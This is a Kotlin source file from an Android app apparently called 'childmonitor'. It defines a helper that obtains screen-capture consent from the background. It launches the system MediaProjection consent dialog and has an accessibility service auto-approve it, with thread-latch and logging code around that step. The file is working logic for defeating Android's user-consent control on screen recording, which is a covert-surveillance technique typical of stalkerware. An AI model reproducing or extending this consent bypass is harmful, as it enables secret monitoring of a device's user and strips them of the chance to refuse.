package com.childmonitor.capture

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.util.Log
import com.childmonitor.MonitoringPrefs
import com.childmonitor.accessibility.ScreenCaptureAutoApprove
import com.childmonitor.debug.PcpFlowLogger
import com.childmonitor.debug.PermissionDebugLogger
import com.childmonitor.deviceowner.MediaProjectionConsentActivity
import com.childmonitor.sync.HeartbeatSyncManager
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/**
 * Obtains MediaProjection consent from background when accessibility auto-approve is armed.
 * Blocks on a worker thread until consent is saved or the wait times out.
 */
object MediaProjectionConsentHelper {

    private const val TAG = "MediaProjConsentHelper"
    private const val DEFAULT_TIMEOUT_MS = 45_000L

    private val consentLatch = AtomicReference<CountDownLatch?>(null)

    @JvmStatic
    fun hasConsent(context: Context): Boolean {
        val ok = MediaProjectionTokenStore.hasValidToken(context)
        PcpFlowLogger.log(
            PcpFlowLogger.Category.PERMISSION_FLOW,
            "hasConsent",
            "granted=$ok ${MediaProjectionTokenStore.debugState(context)}",
        )
        return ok
    }

    /**
     * Returns true when consent is already stored, or after launching the system dialog
     * and auto-approving it via accessibility (if enabled).
     */
    @JvmStatic
    fun ensureConsent(context: Context, timeoutMs: Long = DEFAULT_TIMEOUT_MS): Boolean {
        PermissionDebugLogger.enter("MediaProjectionConsentHelper.ensureConsent", "timeoutMs=$timeoutMs")
    if (hasConsent(context)) {
      PcpFlowLogger.log(PcpFlowLogger.Category.PERMISSION_FLOW, "ensureConsent — already granted, skip dialog")
      HeartbeatSyncManager.syncProjectionRestored(context.applicationContext)
      PermissionDebugLogger.exit("MediaProjectionConsentHelper.ensureConsent", "already granted")
      return true
    }

    if (!ScreenCaptureAutoApprove.isReady(context)) {
      PcpFlowLogger.warn(
          PcpFlowLogger.Category.PERMISSION_FLOW,
          "ensureConsent blocked — accessibility not ready",
          "Enable Device Monitor in Settings → Accessibility first",
      )
      PermissionDebugLogger.exit("MediaProjectionConsentHelper.ensureConsent", "accessibility not ready")
      return false
    }

    // Another thread is already showing the consent dialog — wait for it.
        consentLatch.get()?.let { existing ->
            PcpFlowLogger.log(PcpFlowLogger.Category.PERMISSION_FLOW, "ensureConsent — awaiting in-flight dialog")
            return try {
                val signaled = existing.await(timeoutMs, TimeUnit.MILLISECONDS)
                val granted = signaled && hasConsent(context)
                PcpFlowLogger.log(
                    PcpFlowLogger.Category.PERMISSION_FLOW,
                    "ensureConsent — in-flight dialog finished",
                    "signaled=$signaled granted=$granted",
                )
                granted
            } catch (e: InterruptedException) {
                Thread.currentThread().interrupt()
                false
            }
        }

        ScreenCaptureAutoApprove.armForConsent(context, timeoutMs)
        val latch = CountDownLatch(1)
        consentLatch.set(latch)
        try {
            PcpFlowLogger.log(
                PcpFlowLogger.Category.PERMISSION_FLOW,
                "ensureConsent — launching MediaProjectionConsentActivity",
                "timeoutMs=$timeoutMs autoApproveArmed=true",
            )
            Log.i(TAG, "Requesting MediaProjection consent (accessibility auto-approve armed)")
            val intent = Intent(context, MediaProjectionConsentActivity::class.java)
            if (context !is Activity) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            val signaled = latch.await(timeoutMs, TimeUnit.MILLISECONDS)
            val granted = signaled && hasConsent(context)
            if (granted) {
                PcpFlowLogger.log(PcpFlowLogger.Category.PERMISSION_FLOW, "ensureConsent — SUCCESS")
                Log.i(TAG, "MediaProjection consent obtained")
                HeartbeatSyncManager.syncProjectionRestored(context.applicationContext)
            } else {
                PcpFlowLogger.warn(
                    PcpFlowLogger.Category.PERMISSION_FLOW,
                    "ensureConsent — FAILED",
                    "signaled=$signaled state=${MediaProjectionTokenStore.debugState(context)}",
                )
                Log.w(TAG, "MediaProjection consent not obtained (signaled=$signaled)")
            }
            return granted
        } catch (e: InterruptedException) {
            Thread.currentThread().interrupt()
            PcpFlowLogger.error(PcpFlowLogger.Category.PERMISSION_FLOW, "ensureConsent interrupted", e)
            return false
        } finally {
            consentLatch.compareAndSet(latch, null)
            ScreenCaptureAutoApprove.disarm(context)
            PcpFlowLogger.log(PcpFlowLogger.Category.PERMISSION_FLOW, "ensureConsent — auto-approve disarmed")
            PermissionDebugLogger.exit("MediaProjectionConsentHelper.ensureConsent")
        }
    }

    internal fun signalConsentComplete() {
        PcpFlowLogger.log(PcpFlowLogger.Category.PERMISSION_FLOW, "signalConsentComplete — releasing waiters")
        consentLatch.get()?.countDown()
    }
}
